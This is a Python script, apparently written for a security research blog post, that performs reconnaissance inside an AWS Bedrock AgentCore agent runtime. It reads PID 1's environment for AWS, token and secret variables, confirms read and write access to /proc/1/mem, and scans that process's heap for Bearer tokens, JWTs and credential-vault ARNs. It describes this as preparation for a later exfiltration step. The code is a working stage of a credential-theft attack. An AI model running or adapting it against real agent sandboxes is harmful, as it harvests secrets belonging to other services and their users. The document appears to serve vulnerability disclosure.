"""Blog demo — detailed runtime recon for the identity vault blog post.

Shows:
  1. Process identity + capabilities (who are we, what can we do)
  2. Full filesystem root (all entries, permissions, no truncation)
  3. Token vault / Identity SDK paths in site-packages
  4. Loopy + Strands source layout
  5. /proc/1/environ — vault ARN references + AWS vars
  6. /proc/1/mem access check (the primitive)

No env vars needed. No exfil. Pure recon for blog screenshots.
Designed to produce complete output — no truncation.

Hosted at github.com/nivmorabin/skills/dict-walk/pid1_blog_recon.py
"""
import os
import subprocess
import sys


def run(cmd, timeout=10):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=timeout, text=True)
        return (r.stdout.strip() or '') + (('\n[stderr] ' + r.stderr.strip()) if r.stderr.strip() else '')
    except subprocess.TimeoutExpired:
        return '(timeout)'
    except Exception as e:
        return f'(error: {e})'


def section(title):
    print(f'\n{"=" * 60}')
    print(f'  {title}')
    print(f'{"=" * 60}')


def main():
    # --- 1. Process identity ---
    section('1. PROCESS IDENTITY')
    print(run('id'))
    print(f'PID: {os.getpid()}')
    print(f'PPID: {os.getppid()}')
    print(f'UID: {os.getuid()}')
    print(f'CWD: {os.getcwd()}')

    # --- 2. Filesystem root (full, no truncation) ---
    section('2. FILESYSTEM ROOT (ls -la /)')
    print(run('ls -la /'))

    # --- 3. /opt/amazon layout ---
    section('3. /opt/amazon LAYOUT')
    print(run('ls -la /opt/amazon/'))
    print()
    print('--- /opt/amazon/src/ ---')
    print(run('ls -la /opt/amazon/src/ 2>/dev/null || echo "(not found)"'))
    print()
    print('--- /opt/amazon/lib/ (top-level) ---')
    print(run('ls /opt/amazon/lib/ 2>/dev/null | head -30'))

    # --- 4. Token vault / Identity SDK in site-packages ---
    section('4. TOKEN VAULT / IDENTITY SDK')
    pkg_dir = '/opt/amazon/lib/python3.10/site-packages'

    print(f'--- Searching for Identity SDK in {pkg_dir} ---')
    # Look for bedrock_agentcore identity module
    identity_paths = []
    for root, dirs, files in os.walk(pkg_dir):
        for f in files:
            full = os.path.join(root, f)
            rel = full[len(pkg_dir)+1:]
            if 'identity' in rel.lower() and rel.endswith('.py'):
                identity_paths.append(rel)
            if 'credential' in rel.lower() and rel.endswith('.py'):
                identity_paths.append(rel)
            if 'token_vault' in rel.lower() or 'tokenvault' in rel.lower():
                identity_paths.append(rel)
    for p in sorted(set(identity_paths))[:30]:
        print(f'  {p}')
    if not identity_paths:
        print('  (no identity/credential/token_vault .py files found)')

    # --- 5. Loopy source layout ---
    section('5. LOOPY SOURCE LAYOUT')
    loopy_dir = os.path.join(pkg_dir, 'loopy')
    if os.path.isdir(loopy_dir):
        print(f'--- {loopy_dir}/ ---')
        for root, dirs, files in os.walk(loopy_dir):
            level = root[len(loopy_dir):].count(os.sep)
            indent = '  ' * (level + 1)
            print(f'{indent}{os.path.basename(root)}/')
            sub_indent = '  ' * (level + 2)
            for f in sorted(files)[:20]:
                print(f'{sub_indent}{f}')
            if len(files) > 20:
                print(f'{sub_indent}... ({len(files)} total)')
    else:
        print(f'  loopy dir not found at {loopy_dir}')
        # Try find
        print(run(f'find {pkg_dir} -path "*/loopy*" -type f 2>/dev/null | head -20'))

    # --- 6. Strands source layout ---
    section('6. STRANDS-AGENTS SOURCE LAYOUT')
    strands_dir = os.path.join(pkg_dir, 'strands')
    if os.path.isdir(strands_dir):
        print(f'--- {strands_dir}/ (top-level modules) ---')
        for item in sorted(os.listdir(strands_dir)):
            full = os.path.join(strands_dir, item)
            if os.path.isdir(full):
                sub_files = os.listdir(full)
                print(f'  {item}/ ({len(sub_files)} files)')
            else:
                print(f'  {item}')
    else:
        print(f'  strands dir not found at {strands_dir}')
        print(run(f'find {pkg_dir} -path "*/strands*" -type d 2>/dev/null | head -10'))

    # --- 7. /proc/1/environ — vault ARN + AWS vars ---
    section('7. /proc/1/environ (vault references + AWS vars)')
    try:
        raw_env = open('/proc/1/environ', 'rb').read()
        entries = raw_env.split(b'\x00')
        all_vars = {}
        for entry in entries:
            if b'=' in entry:
                k, v = entry.split(b'=', 1)
                all_vars[k.decode('utf-8', errors='replace')] = v.decode('utf-8', errors='replace')

        # Show AWS/AGENTCORE vars
        print('--- AWS / AGENTCORE vars ---')
        for k in sorted(all_vars):
            if k.startswith(('AWS_', 'AGENTCORE_')):
                print(f'  {k}={all_vars[k][:120]}')

        # Show vault/credential/token references
        print()
        print('--- Vault / credential references ---')
        vault_found = False
        for k, v in sorted(all_vars.items()):
            if any(x in v.lower() for x in ('credential', 'token-vault', 'apikey', 'vault')):
                print(f'  {k}={v[:150]}')
                vault_found = True
            if any(x in k.lower() for x in ('credential', 'token', 'vault', 'secret')):
                print(f'  {k}={v[:150]}')
                vault_found = True
        if not vault_found:
            print('  (no vault/credential references in env — vault is resolved at invoke time)')
            print('  The ${arn:...} reference is in harness CONFIG, not in runtime env.')
            print('  After invoke, resolved bytes land in PID 1 HEAP (httpx buffers).')

        # Show PYTHON vars
        print()
        print('--- PYTHON vars ---')
        for k in sorted(all_vars):
            if k.startswith('PYTHON'):
                print(f'  {k}={all_vars[k][:120]}')

    except Exception as e:
        print(f'  ERROR reading /proc/1/environ: {e}')

    # --- 8. /proc/1/mem access ---
    section('8. /proc/1/mem ACCESS (the primitive)')
    print(f'  os.access("/proc/1/mem", R_OK) = {os.access("/proc/1/mem", os.R_OK)}')
    print(f'  os.access("/proc/1/mem", W_OK) = {os.access("/proc/1/mem", os.W_OK)}')
    print()
    # Show PID 1 status for context
    try:
        status = open('/proc/1/status').read()
        print('  /proc/1/status (selected):')
        for line in status.splitlines():
            if line.startswith(('Name:', 'Uid:', 'Gid:', 'Seccomp:', 'NoNewPrivs:', 'TracerPid:')):
                print(f'    {line}')
    except Exception as e:
        print(f'  ERROR: {e}')

    # Yama check
    try:
        yama = open('/proc/sys/kernel/yama/ptrace_scope').read().strip()
        print(f'\n  /proc/sys/kernel/yama/ptrace_scope = {yama}')
    except FileNotFoundError:
        print(f'\n  /proc/sys/kernel/yama/ptrace_scope = NOT LOADED (permissive)')

    print()
    print('  CONCLUSION: shell tool (uid=0) can open /proc/1/mem (uid=0)')
    print('  for both reading and writing. No ptrace, no capabilities needed.')

    # --- 9. Heap anchor scan ---
    section('9. WHAT LIVES IN PID 1 HEAP (anchor scan)')
    print('  Scanning /proc/1/mem for structural anchors...')
    print('  (This is what the exfil script will extract in the next cell.)')
    print()

    ANCHORS = [
        # Harness configuration objects (Pydantic models in memory)
        (b'HarnessRemoteMcpConfig', 'MCP tool config (Pydantic model)'),
        (b'HarnessToolType', 'Tool type enum'),
        (b'HarnessHeaders', 'HTTP headers config'),
        # MCP protocol traffic residue
        (b'"method":"initialize"', 'MCP initialize call'),
        (b'"method":"tools/list"', 'MCP tools/list call'),
        (b'"method":"tools/call"', 'MCP tools/call invocation'),
        (b'"protocolVersion":"2024-11-05"', 'MCP protocol version'),
        # HTTP traffic residue
        (b'Authorization: Bearer', 'Authorization header (credential!)'),
        (b'authorization: Bearer', 'Authorization header (lowercase)'),
        (b'server: uvicorn', 'Uvicorn response header'),
        (b'HTTP/1.1 200 OK', 'HTTP response status'),
        # Identity vault artifacts
        (b'credential-provider/', 'Credential provider ARN'),
        (b'token-vault/', 'Token vault ARN path'),
        (b'resolve_header_references', 'Loopy vault-resolution function'),
        (b'GetWorkloadAccessToken', 'Identity API call name'),
        (b'workloadIdentity', 'Workload identity reference'),
        # JWT signatures (credential bytes)
        (b'eyJraWQiOi', 'JWT with kid header (credential)'),
        (b'eyJhbGciOi', 'JWT with alg header (credential)'),
        # Runtime URL
        (b'bedrock-agentcore.us-east-1.amazonaws.com/runtimes/', 'AgentCore runtime URL'),
    ]

    # Enumerate writable regions
    regions = []
    for line in open('/proc/1/maps').readlines():
        parts = line.split()
        if len(parts) < 2:
            continue
        perms = parts[1]
        if 'r' not in perms:
            continue
        addr_range = parts[0]
        try:
            start_s, end_s = addr_range.split('-')
            lo, hi = int(start_s, 16), int(end_s, 16)
            if hi - lo >= 4096 and hi - lo <= 50 * 1024 * 1024:
                regions.append((lo, hi))
        except Exception:
            continue

    found_anchors = {}
    with open('/proc/1/mem', 'rb') as mem:
        for lo, hi in regions:
            try:
                mem.seek(lo)
                chunk = mem.read(hi - lo)
            except (OSError, OverflowError):
                continue
            for needle, label in ANCHORS:
                count = chunk.count(needle)
                if count > 0:
                    found_anchors[label] = found_anchors.get(label, 0) + count

    print(f'  {"ANCHOR":<45s} {"HITS":>5s}')
    print(f'  {"-"*45} {"-----":>5s}')
    for needle, label in ANCHORS:
        count = found_anchors.get(label, 0)
        marker = '  <<<' if count > 0 and 'credential' in label.lower() else ''
        if count > 0:
            print(f'  {label:<45s} {count:>5d}{marker}')

    total_credential_hits = sum(
        found_anchors.get(label, 0)
        for _, label in ANCHORS
        if 'credential' in label.lower() or 'JWT' in label or 'Bearer' in label
    )
    print()
    if total_credential_hits > 0:
        print(f'  >>> {total_credential_hits} credential-shaped artifacts in PID 1 heap.')
        print('  >>> These are the vault-resolved tokens the next cell exfiltrates.')
    else:
        print('  (No credential artifacts found — run Cell 2 first to trigger')
        print('   a legitimate MCP call that resolves the vault credential.)')

    section('DONE')


if __name__ == '__main__':
    main()
